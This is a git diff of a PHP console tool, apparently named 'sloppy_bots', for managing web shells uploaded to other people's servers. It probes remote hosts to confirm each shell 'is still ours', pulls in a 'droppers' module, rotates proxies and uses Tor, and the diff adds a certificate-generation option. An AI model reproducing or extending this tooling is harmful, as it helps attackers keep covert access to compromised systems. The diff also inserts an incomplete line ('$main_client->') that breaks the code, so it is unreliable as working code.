@@ -8,37 +8,17 @@ if (strtolower(php_uname()) == "windows") {
 } else {
     define('clears', "clear");
 }
+
 require "includes/db/postgres_checker.php";
 require "includes/droppers/dynamic_generator.php";
-
-$cof = array(
-    "sloppy_db" => array(
-        "host" => "127.0.0.1",
-        "port" => "5432",
-        "user" => get_current_user(),
-        "password" => trim(readline("Password?Press enter for none->")),
-        "dbname" => "sloppy_bots",
-    ),
-    "sloppy_http" => array(
-        "useragent" => "sp1.1",
-        "proxy" => trim(readline("Proxy?(schema://host:port) Press enter for none->")),
-        "verify_ssl" => trim(readline("Verify SSL?(yes/no)->"))
-    ),
-    "sloppy_proxies" => array(
-        "proxy_init"=>null,
-        "use_proxies"=>null,
-        "rotate"=>null,
-        "use_tor"=>true
-    )
-);
+$firstRun = new postgres_checker();
 const response_array = array(
     "default" => PHP_EOL . "\e[1;33m%s%s Hmm. A status other than what i was looking for was returned, please manually confirm the shell was uploaded.\e[0m" . PHP_EOL,
     "200" => PHP_EOL . "\e[0;32m%s%s is still ours!\e[0m" . PHP_EOL,
     "404" => PHP_EOL . "\e[0;31m%s%s Looks like our shell was caught... sorry..\e[0m" . PHP_EOL,
     "500" => PHP_EOL . "\e[1;31m%s%s Your useragent was not the correct one... did you forget??\e[0m" . PHP_EOL
 );
-is_file("includes/config/sloppy_config.ini") ? define("config", parse_ini_file('includes/config/sloppy_config.ini', true, 2)) : define("config", $cof);
-$firstRun = new postgres_checker();
+define("config", parse_ini_file('includes/config/sloppy_config.ini', true, 2));
 if (empty(config['sloppy_db']['pass'])) {
     $firstRun->createDB();
     define('DBCONN', sprintf("host=%s port=%s user=%s password=%s dbname=%s",
@@ -137,7 +117,8 @@ function menu()
         (AT) Add tool\e[0m
         \e[0;31;40m(UP)load tool to bot - currently not working, will be soon.\e[0m
         \e[0;32m(L)ist (T)ools
-        \e[0;32m(G)rab (P)roxy\e[0m                                            
+        \e[0;32m(G)rab (P)roxy\e[0m
+        (G)enerate (C)ert                                            
         (M)ain menu                                                                 
         (Q)uit\e[0m                                                                      
 _MENU;
@@ -749,6 +730,7 @@ function check($host, $path, $batch, $proxy)
         curl_setopt(CHH, CURLOPT_RETURNTRANSFER, true);
         foreach ($rows as $r) {
             echo "\nTrying: {$r['rhost']}{$r['uri']}\n";
+            $main_client->
             curl_setopt(CHH, CURLOPT_URL, $r['rhost'] . $r['uri'] . "?qs=cqS");
             curl_exec(CHH);
             switch (curl_getinfo(CHH, CURLINFO_HTTP_CODE)) {
@@ -1137,6 +1119,12 @@ while ($run) {
         case "gp":
             $p_judge = trim(readline('Proxy judge?(schema://domain:port/ or blank for none.)-> '));
             grab_proxy(readline("What are we doing?(test/confirm)->"), empty($p_judge) ? "https://icanhazip.com" : $p_judge, is_null($rotate_proxy) ? false : $rotate_proxy);
+            break;
+        case 'gc':
+            $t = new dynamic_generator();
+            $t->genCert((int)trim(readline("Cert Strength please.")), "RSA", '', '', array(
+                "countryName" => "Uk"
+            ));
             break;
         default:
             logo($lc, clears, "", "", '');
